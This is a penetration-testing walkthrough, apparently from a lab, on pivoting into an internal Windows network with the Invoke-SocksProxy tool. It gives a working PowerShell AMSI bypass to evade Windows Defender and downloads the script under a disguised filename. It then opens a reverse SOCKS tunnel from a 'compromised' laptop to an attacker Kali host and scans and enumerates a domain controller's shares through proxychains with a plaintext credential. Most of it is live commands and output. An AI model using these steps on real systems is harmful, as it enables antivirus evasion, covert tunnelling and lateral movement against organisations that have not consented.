@@ -1,0 +1,226 @@
+======================================================================================================================================================
+Pivoting with Invoke-SocksProxy (basic example)
+======================================================================================================================================================
+
+Invoke-SocksProxy - Socks proxy, and reverse socks server using PowerShell. 
+
+=> Github page "https://github.com/p3nt4/Invoke-SocksProxy"
+
+The tool Invoke-SocksProxy is composed of:
+> a PowerShell script (Invoke-SocksProxy.psm1) that contains 2 main functions:
+  - 'Invoke-SocksProxy' which can be used to create a simple local Socks 4/5 proxy on a Windows machine 
+  - 'Invoke-ReverseSocksProxy' which can be used to create a reverse Socks 4/5 proxy i.e. a TCP tunnel initiating outbond SSL connections between a 
+     local Windows machine and a remote host. The script is proxy aware and the tunnel can go through the Windows machine's proxy.
+> a python script that is a reverse Socks proxy handler (ReverseSocksProxyHandler.py)
+
+Context
+--------
+During penetration tests, the function 'Invoke-ReverseSocksProxy' can be used to create a tunnel between a target Windows machine and an Internet-facing remote
+server belonging to the pentesters (e.g. a Kali VM running in AWS or Azure). This tool is usefull to pass trhough firewalls and pivot inside a company's internal
+network after having compromise for example a vulnerable internet-facing website hosted on a Windows server or a Windows laptop via a phishing attack.
+
+
+======================================================================================================================================================
+PoC - Step 1 - Start a reverse Socks proxy handler (ReverseSocksProxyHandler.py) on an attack server (e.g. a Kali Linux VM)
+======================================================================================================================================================
+
+1.1. Generate a private key and a self signed cert on your remote attacker machine (Kali VM) 
+------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Invoke-Socksproxy$ openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
+.+.+........+.+..+...+.........+.......+...+......+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*............+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+............+.......+........+.............+...+........................+..+...+..........+..+.+...+.....+......+.............+...............+......+.....+....+..+...............+....+.....+.......+...............+.....+..........+..............+....+.....+..........+..+...+..........+.....+................+..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+.....+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*...+......+...+...........+....+......+...........+....+............+.....+...+...................+...+........+....+..+.+.....+.......+........+......................+............+.....+...+.+..+.........+...+...+....+...+..+....+.....+............+....+.....+...+......+...................+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:US
+State or Province Name (full name) [Some-State]:NY
+Locality Name (eg, city) []:NY
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:Test
+Organizational Unit Name (eg, section) []:Test
+Common Name (e.g. server FQDN or YOUR name) []:Test
+Email Address []:-
+
+
+1.2. Get the certificate fingerprint to verify it
+--------------------------------------------------
+jeff@kali:~/Documents/Tools/Invoke-Socksproxy$ openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
+C236E8E0821F4582E58FAC4B33A9CF4FF4B511EC
+
+
+1.3. Set up 'Proxychains' on your attacker machine
+---------------------------------------------------
+# apt-get install proxychains
+# cp /etc/proxychains.conf /etc/proxychains.conf.backup
+# echo "socks5  127.0.0.1 1080" >> /etc/proxychains.conf
+
+jeff@kali:~/Documents/Tools/Invoke-Socksproxy$  tail /etc/proxychains.conf
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+socks5  127.0.0.1 1080
+
+
+1.4. Start the reverse Socks proxy handler using the python script 'ReverseSocksProxyHandler.py'
+-------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Invoke-Socksproxy$ sudo python3 ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
+[sudo] password for jeff:
+Socks Server listening on: 1080
+/home/jeff/Documents/Tools/Invoke-Socksproxy/ReverseSocksProxyHandler.py:16: DeprecationWarning: ssl.PROTOCOL_TLSv1 is deprecated
+  context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+Handler listening on: 443
+
+=> There is an error with the TLSv1 protocol when using python3 so I used python2 isntead...
+
+jeff@kali:~/Documents/Tools/Invoke-Socksproxy$ sudo python2 ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
+Socks Server listening on: 1080
+Handler listening on: 443
+
+
+=======================================================================================================================================
+PoC - Step 2. Download the script 'Invoke-SocksProxy.psm1' on a compromised Windows 10 Laptop (with the Windows Defender AV enabled)
+              and use it to start a reverse socks proxy connection to the remote attack server (Kali VM) 
+=======================================================================================================================================
+
+2.1. Start a PowerShell prompt and bypass the AMSI because the script is flagged by Antivirus like Windows Defender (note: we could also obfuscate the script)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\lowprivuser> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected,AntivirusSignatureLastUpdated | FL
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+IsTamperProtected         : True
+AntivirusSignatureLastUpdated : 8/29/2023 1:08:24 PM
+
+PS C:\Users\lowprivuser> $superaudit = [Ref].Assembly.GetTypes();
+
+PS C:\Users\lowprivuser> ForEach($boat in $superaudit) {if ($boat.Name -like "*iutils") {$cap = $boat}};$data = $cap.GetFields('NonPublic,Static');ForEach($europe in $data) 
+{if ($europe.Name -like "*itFailed") {$fire = $europe}};$fire.SetValue($null,$true)
+
+
+2.2. Download the script 'Invoke-SocksProxy.psm1' and use it to start a reverse proxy tunnel with the attack server (Kali VM - 192.168.56.101)
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\lowprivuser> wget -URI https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1 -OutFile Inv0ke-S0cksPr0xy.psm1
+
+PS C:\Users\lowprivuser> Import-Module .\Inv0ke-S0cksPr0xy.psm1
+
+PS C:\Users\lowprivuser> Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.56.101 -certFingerprint 'C236E8E0821F4582E58FAC4B33A9CF4FF4B511EC' -maxRetries 10 -useSystemProxy
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Connecting to:  192.168.56.101 : 443
+Server closed.
+Cannot connect to handler, max Number of attempts reached, exiting..
+
+=> There is an error so I removed the parameters "-certFingerprint" and "-useSystemProxy" and now it is working :=)
+
+PS C:\Users\lowprivuser> Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.56.101 -maxRetries 10
+Connecting to:  192.168.56.101 : 443
+Connected
+Connecting to:  192.168.56.101 : 443
+Connected
+<SNIP>
+
+On the server side (Kali VM) it looks like this
+------------------------------------------------
+jeff@kali:~/Documents/Tools/Invoke-Socksproxy$ sudo python2 ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
+Socks Server listening on: 1080
+Handler listening on: 443
+[SSL: HTTPS_PROXY_REQUEST] https proxy request (_ssl.c:727)
+[SSL: HTTPS_PROXY_REQUEST] https proxy request (_ssl.c:727)
+[SSL: HTTPS_PROXY_REQUEST] https proxy request (_ssl.c:727)
+[SSL: HTTPS_PROXY_REQUEST] https proxy request (_ssl.c:727)
+<snip>
+Reverse Socks Connection Received: 192.168.56.1:50245
+Reverse Socks Connection Received: 192.168.56.1:50246
+Reverse Socks Connection Received: 192.168.56.1:50247
+Reverse Socks Connection Received: 192.168.56.1:50248
+<snip>
+
+
+=========================================================================================================================================================
+POC - Step 3 - Use Proxychains on the attack server (Kali VM - 192.168.56.101) and the reverse socks proxy connection established from the compromised
+               Windows laptop (192.168.1.144) to pivot into the subnet '192.168.1.0/24'.
+=========================================================================================================================================================
+
+Context - Without using Proxychains & the reverse socks proxy tunnel, the network traffic towards the subnet 192.168.1.0/24 is filtered from the Kali VM 
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ nmap -sT -Pn -p 445,3389 192.168.1.144,167
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-30 01:19 CEST
+
+Nmap scan report for 192.168.1.144
+Host is up (0.0000020s latency).
+PORT     STATE    SERVICE
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+
+Nmap scan report for dc1.company.work (192.168.1.167)
+Host is up (0.000018s latency).
+PORT     STATE    SERVICE
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 13.04 seconds
+
+
+Example 1 - Nmap port scan of the Windows laptop '192.168.1.144' from the Kali VM by going through the reverse socks proxy tunnel with proxychains
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ proxychains nmap -sT -n -p 445,3389 192.168.1.144
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-30 01:05 CEST
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.144:80-<--timeout
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.144:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.144:445-<><>-OK
+Nmap scan report for 192.168.1.144
+Host is up (1.6s latency).
+
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds
+
+
+Example 2 - Network share enumeration with CrackMapExec of the Windows Domain Controller '192.168.1.167' from the Kali VM by going through the reverse
+            socks proxy tunnel with proxychains
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ proxychains crackmapexec smb 192.168.1.167 -u lowprivuser -p 'SuperPassw0rd' --shares
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.167:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.167:135-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.167:445-<><>-OK
+SMB         192.168.1.167   445    DC1              [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC1) (domain:COMPANY) (signing:True) (SMBv1:True)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.167:445-<><>-OK
+SMB         192.168.1.167   445    DC1              [+] COMPANY\lowprivuser:SuperPassw0rd
+SMB         192.168.1.167   445    DC1              [+] Enumerated shares
+SMB         192.168.1.167   445    DC1              Share           Permissions     Remark
+SMB         192.168.1.167   445    DC1              -----           -----------     ------
+SMB         192.168.1.167   445    DC1              ADMIN$                          Remote Admin
+SMB         192.168.1.167   445    DC1              C$                              Default share
+SMB         192.168.1.167   445    DC1              IPC$                            Remote IPC
+SMB         192.168.1.167   445    DC1              NETLOGON        READ            Logon server share
+SMB         192.168.1.167   445    DC1              Share           READ
+SMB         192.168.1.167   445    DC1              SYSVOL          READ            Logon server share
+
+jeff@kali:~$
